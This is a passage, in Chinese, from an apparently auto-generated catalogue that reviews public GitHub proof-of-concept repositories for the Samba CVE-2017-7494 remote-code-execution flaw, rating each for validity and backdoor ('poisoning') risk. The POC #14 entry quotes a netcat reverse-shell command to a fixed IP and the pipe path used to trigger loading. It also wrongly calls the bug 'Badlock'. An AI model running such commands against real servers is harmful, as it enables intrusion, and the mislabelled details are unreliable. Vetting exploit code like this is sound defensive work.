CVE-2017-7494，也被称为“SambaCry”，是Samba 3.5.0到4.6.4, 4.5.10, 和4.4.14版本中存在的一个远程代码执行漏洞。攻击者可以通过上传一个共享库到可写共享文件夹，然后诱使服务器加载并执行它，从而实现远程代码执行。\n\n**有效性：**根据漏洞库信息和漏洞利用代码的描述，该漏洞利用是有效的，并且存在公开的POC。\n\n**投毒风险：**提供的POC代码主要包含一个README.md文件和一个Ruby脚本`is_known_pipename.rb`。README.md文件描述了漏洞的细节和利用条件，Ruby脚本很可能是用于辅助漏洞利用，例如检测目标环境是否满足某些先决条件。直接的投毒代码的可能性较低，但不能完全排除作者在脚本中隐藏恶意代码的可能性。因此，投毒风险评估为5%。需要进一步审计`is_known_pipename.rb`脚本的内容才能确定是否存在恶意行为。\n\n**利用方式：**\n1.  **获得访问权限：** 攻击者需要具有对Samba服务器上可写共享目录的有效用户凭据。在某些配置不当的情况下，匿名访问也可能允许未经身份验证的写入权限。\n2.  **上传恶意共享库：** 攻击者编译一个包含恶意代码的共享库（例如，`.so`文件），并将其上传到目标服务器上的可写共享目录。\n3.  **触发加载执行：** 攻击者通过构造一个特殊的SMB请求，诱使Samba服务器加载并执行上传的共享库。这通常涉及到修改SMB配置或利用Samba的路径处理机制。例如，通过 `loadmodule` 选项指定恶意库的路径。\n4.  **远程代码执行：** 一旦恶意共享库被加载，它将在Samba服务器的上下文中执行，允许攻击者执行任意命令，控制服务器，或进一步渗透网络。

**项目地址:** [homjxi0e/CVE-2017-7494](https://github.com/homjxi0e/CVE-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #14

**来源**: [CVE-2017-7494-incredible1yu_CVE-2017-7494.md](../2017/CVE-2017-7494-incredible1yu_CVE-2017-7494.md)

## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** since 3.5.0 and before 4.6.4, 4.5.10 and 4.4.14

**利用条件:** 需要可写共享目录和对Samba服务器的网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2017-7494，又名"Badlock"，是一个存在于Samba中的远程代码执行漏洞。漏洞原理是攻击者可以上传一个恶意的共享库（.so文件）到可写的共享目录，然后通过SMB协议的一个特性，让Samba服务器加载并执行该恶意库。 

**漏洞利用方式：**

1.  **编译恶意共享库：** 使用提供的`samba_init.c`编译生成`libsamba.so`。这个`.so`文件包含攻击者想要执行的恶意代码，例如反弹shell。
2.  **上传恶意共享库：** 使用`smbclient`命令将`libsamba.so`上传到Samba服务器上具有写入权限的共享目录中。 `is_known_pipename.c`文件中的`upload_module`函数执行此步骤。
3.  **触发服务器加载恶意共享库：** 通过构造一个特殊的SMB请求，指定要加载的共享库路径（PIPE），诱使Samba服务器加载并执行`libsamba.so`。 `is_known_pipename.c`文件中的`load_module` 函数，以及`main`函数中的`char *pStr = "\\PIPE\\/home/chenzy/share/libsamba.so";`和`load_module("192.168.0.152/IPC$", "", "", pStr);`执行此步骤。
4.  **代码执行：** 当Samba服务器加载`libsamba.so`时，`samba_init_module()`函数被执行，从而触发了反弹shell操作。`samba_init.c`中的`system("nc -e /bin/bash 192.168.0.172 47288");`完成了反弹shell的操作。

**有效性：**

根据提供的漏洞信息和利用代码，此POC是有效的。漏洞库信息表明该漏洞是可利用的，并且存在公开的漏洞利用代码。提供的代码演示了如何利用该漏洞实现远程代码执行。

**投毒风险：**

经过对提供的POC代码的分析，没有发现明显的投毒代码。该代码的主要功能是利用漏洞执行指定的命令（例如，反弹shell）。需要注意的是，`samba_init.c` 中执行的命令`nc -e /bin/bash 192.168.0.172 47288` 本身具有潜在的风险，但这不是投毒，而是漏洞利用的一部分。这段代码在目标机器上反弹了一个shell给攻击者的192.168.0.172的47288端口。因此，投毒风险为0%。

**项目地址:** [incredible1yu/CVE-2017-7494](https://github.com/incredible1yu/CVE-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #15

**来源**: [CVE-2017-7494-john-80_cve-2017-7494.md](../2017/CVE-2017-7494-john-80_cve-2017-7494.md)

## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 3.5.0 <= Samba < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 需要存在可写共享目录，且Samba版本受影响

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2017-7494，又称“SambaCry”，是一个存在于Samba服务器中的远程代码执行漏洞。攻击者可以利用此漏洞通过上传恶意共享库到可写共享目录，然后诱使服务器加载并执行该库，从而实现远程代码执行。根据漏洞库信息，受影响的Samba版本是从3.5.0到4.6.4之前的版本，以及4.5.10和4.4.14之前的版本。 exploit-db上存在可用的漏洞利用代码。提供的利用代码包含搭建靶机的配置信息和samba的安装步骤,主要关注的投毒风险在于samba的配置信息, 其次python是否包含恶意命令. 结合搜索引擎分析，确认此漏洞的利用方式较为直接，上传恶意的动态库触发漏洞. 投毒的可能性较低，代码主要为环境配置和samba的安装步骤，恶意投毒代码的占比很小。该漏洞已被CISA收录在已知被利用的漏洞目录中(KEV)。

**项目地址:** [john-80/cve-2017-7494](https://github.com/john-80/cve-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

## POC #16

**来源**: [CVE-2017-7494-joxeankoret_CVE-2017-7494.md](../2017/CVE-2017-7494-joxeankoret_CVE-2017-7494.md)

## CVE-2017-7494-Samba-远程代码执行

**漏洞编号:** CVE-2017-7494

**漏洞类型:** 远程代码执行

**影响应用:** Samba

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 3.5.0 <= Samba < 4.6.4, 4.5.10, 4.4.14

**利用条件:** 可写共享目录

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2017-7494 允许恶意客户端通过上传共享库到可写共享目录，然后导致服务器加载和执行该库，从而实现远程代码执行。漏洞存在于 Samba 3.5.0 及之后版本，直到 4.6.4, 4.5.10 和 4.4.14 之前。

**有效性：**
根据漏洞库信息，此漏洞存在有效的利用方式。存在公开的Exploit-DB链接（42084 和 42060），表明该漏洞已经被成功利用。

**投毒风险：**
提供的代码段是GNU通用公共许可证，不是漏洞利用代码本身，所以不能直接判断是否有投毒风险，但LICENSE的存在不代表没有投毒可能。真正的利用代码是否被植入恶意代码无法判断。因此，从提供的有限信息来看，投毒风险较低，大约为10%。

**利用方式：**
1.  **找到可写的共享目录：** 攻击者首先需要找到 Samba 服务器上配置为可写的共享目录。
2.  **上传恶意共享库：** 攻击者将包含恶意代码的共享库（例如，`.so`文件）上传到该可写共享目录。
3.  **触发加载恶意库：** 攻击者通过构造特定的路径，利用 Samba 的某些特性（可能是一个bug），诱使 Samba 服务器加载并执行该共享库。

总而言之，攻击的关键在于找到可写共享目录以及触发服务器加载恶意共享库。


**项目地址:** [joxeankoret/CVE-2017-7494](https://github.com/joxeankoret/CVE-2017-7494)

**漏洞详情:** [CVE-2017-7494](https://nvd.nist.gov/vuln/detail/CVE-2017-7494)

---

